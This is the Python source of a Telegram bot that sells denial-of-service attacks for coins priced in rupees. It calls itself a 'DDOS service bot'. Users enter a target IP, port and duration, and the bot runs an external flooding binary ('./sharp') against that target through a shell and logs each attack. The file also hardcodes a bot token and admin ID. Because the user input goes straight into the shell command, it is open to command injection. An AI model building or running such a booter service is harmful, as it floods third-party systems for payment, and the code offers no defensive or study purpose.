import json
import subprocess
import datetime
import os
import time
from threading import Thread
from flask import Flask
import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# Telegram bot token
bot = telebot.TeleBot('7793043515:AAFdDKkJORGU8iHhvcZ1fI15XgLowWkOARc')

# Admin user IDs
admin_id = ["5163805719"]

# File paths
COINS_FILE = "user_coins.json"
ATTACK_LOGS_FILE = "attack_logs.json"

# Global variables
user_coins = {}
attack_logs = {}
admin_state = {}
user_state = {}

# Load coins and logs from file
def load_user_coins():
    global user_coins
    try:
        with open(COINS_FILE, 'r') as file:
            user_coins = json.load(file)
    except FileNotFoundError:
        user_coins = {}

def load_attack_logs():
    global attack_logs
    try:
        with open(ATTACK_LOGS_FILE, 'r') as file:
            attack_logs = json.load(file)
    except FileNotFoundError:
        attack_logs = {}

# Save coins and logs to file
def save_user_coins():
    with open(COINS_FILE, 'w') as file:
        json.dump(user_coins, file)

def save_attack_logs():
    with open(ATTACK_LOGS_FILE, 'w') as file:
        json.dump(attack_logs, file)

# Coin management functions
def add_coins(user_id, amount):
    user_id = str(user_id)
    user_coins[user_id] = user_coins.get(user_id, 0) + amount
    save_user_coins()

def deduct_coins(user_id, amount):
    user_id = str(user_id)
    if user_coins.get(user_id, 0) >= amount:
        user_coins[user_id] -= amount
        save_user_coins()
        return True
    return False

def get_user_coins(user_id):
    return user_coins.get(str(user_id), 0)

# Log attack details
def add_attack_log(user_id, target, port, duration):
    user_id = str(user_id)
    if user_id not in attack_logs:
        attack_logs[user_id] = []
    attack_logs[user_id].append({
        "target": target,
        "port": port,
        "duration": duration,
        "timestamp": str(datetime.datetime.now())
    })
    save_attack_logs()

# Load data on startup
load_user_coins()
load_attack_logs()

# Bot handlers
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    user_id = str(message.chat.id)

    markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
    markup.add(KeyboardButton('bgmi'), KeyboardButton('my balance💲'))
    markup.add(KeyboardButton('information⁉️'), KeyboardButton('🤑View Plans'))

    if user_id in admin_id:
        markup.add(KeyboardButton('addcoins'), KeyboardButton('logs'), KeyboardButton('attacklogs'))

    bot.reply_to(
        message,
        f"🎊Welcome {user_name}! Please select an option below. Contact the owner to add coins or for any queries.\n👤Owner: @kiing_op",
        reply_markup=markup
    )

@bot.message_handler(func=lambda message: message.text.lower() == 'bgmi')
def handle_bgmi(message):
    user_id = str(message.chat.id)
    bot.reply_to(message, "Enter the target IP address📡")
    user_state[user_id] = {'step': 1}

@bot.message_handler(func=lambda message: str(message.chat.id) in user_state)
def handle_attack_steps(message):
    user_id = str(message.chat.id)
    state = user_state[user_id]

    if state['step'] == 1:
        state['target'] = message.text
        state['step'] = 2
        bot.reply_to(message, "Enter target port🔌")
    elif state['step'] == 2:
        try:
            state['port'] = int(message.text)
            state['step'] = 3
            bot.reply_to(message, "Enter attack duration (in seconds)⌚")
        except ValueError:
            bot.reply_to(message, "❗Invalid port. Please enter a number.")
    elif state['step'] == 3:
        try:
            state['time'] = int(message.text)
            target, port, duration = state['target'], state['port'], state['time']
            if deduct_coins(user_id, 10):
                bot.reply_to(message, f"Starting attack on {target}:{port} for {duration} seconds. 🚀\n🪙10 coins deducted.")
                subprocess.run(f"./sharp {target} {port} {duration} 1000", shell=True)
                add_attack_log(user_id, target, port, duration)
                bot.reply_to(message, f"🚀Attack completed on {target}:{port} for {duration} seconds.")
                del user_state[user_id]
            else:
                bot.reply_to(message, "❗Insufficient coins. Contact @kiing_op to buy more coins.")
                del user_state[user_id]
        except ValueError:
            bot.reply_to(message, "❗Invalid duration. Please enter a number.")

@bot.message_handler(func=lambda message: message.text.lower() == 'my balance💲')
def show_balance(message):
    user_id = str(message.chat.id)
    bot.reply_to(message, f"Your current balance is: 🪙{get_user_coins(user_id)} coins.")

@bot.message_handler(func=lambda message: message.text.lower() == 'information⁉️')
def show_information(message):
    bot.reply_to(message, "This is a DDOS service bot. Contact the owner @KIING_OP for details or to buy coins.")

@bot.message_handler(func=lambda message: message.text.lower() == 'addcoins')
def admin_add_coins(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        admin_state[user_id] = {'step': 1}
        bot.reply_to(message, "Enter the User ID to add coins:")
    else:
        bot.reply_to(message, "❗You are not authorized to use this command.")

@bot.message_handler(func=lambda message: str(message.chat.id) in admin_state)
def handle_admin_steps(message):
    admin_id = str(message.chat.id)
    state = admin_state[admin_id]

    if state['step'] == 1:
        state['target_user'] = message.text
        state['step'] = 2
        bot.reply_to(message, "Enter the number of coins to add:")
    elif state['step'] == 2:
        try:
            coins = int(message.text)
            target_user = state['target_user']
            add_coins(target_user, coins)
            bot.reply_to(message, f"✅ Successfully added 🪙{coins} coins to User ID: {target_user}.")
            del admin_state[admin_id]
        except ValueError:
            bot.reply_to(message, "❗Invalid amount. Please enter a number.")

@bot.message_handler(func=lambda message: message.text.lower() == '🤑view plans')
def show_plans(message):
    bot.reply_to(message, "🪙100 coins - ₹50\n🪙500 coins - ₹200\n🪙1000 coins - ₹400\nContact @KIING_OP to buy.")

@bot.message_handler(func=lambda message: message.text.lower() == 'logs')
def view_logs(message):
    if str(message.chat.id) in admin_id:
        response = "User Coins Logs:\n"
        for user, coins in user_coins.items():
            response += f"User ID: {user}, Coins: {coins}\n"
        bot.reply_to(message, response)
    else:
        bot.reply_to(message, "❗You are not authorized to view logs.")

@bot.message_handler(func=lambda message: message.text.lower() == 'attacklogs')
def view_attack_logs(message):
    if str(message.chat.id) in admin_id:
        response = "User Attack Logs:\n"
        for user, logs in attack_logs.items():
            response += f"\nUser ID: {user}\n"
            for log in logs:
                response += f" - Target: {log['target']}, Port: {log['port']}, Duration: {log['duration']} seconds, Time: {log['timestamp']}\n"
        bot.reply_to(message, response if response.strip() else "No attack logs available.")
    else:
        bot.reply_to(message, "❗You are not authorized to view attack logs.")

# Flask app to keep alive
app = Flask(__name__)
@app.route('/')
def index():
    return "Bot is running!"

def send_running_status():
    while True:
        try:
            for admin in admin_id:
                bot.send_message(admin, "🔄 Bot is running...")
            time.sleep(60)
        except Exception as e:
            print(f"Error sending status: {e}")
            time.sleep(60)

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t1 = Thread(target=run)
    t2 = Thread(target=send_running_status)
    t1.start()
    t2.start()

# Start the bot
if __name__ == "__main__":
    keep_alive()
    bot.polling(none_stop=True)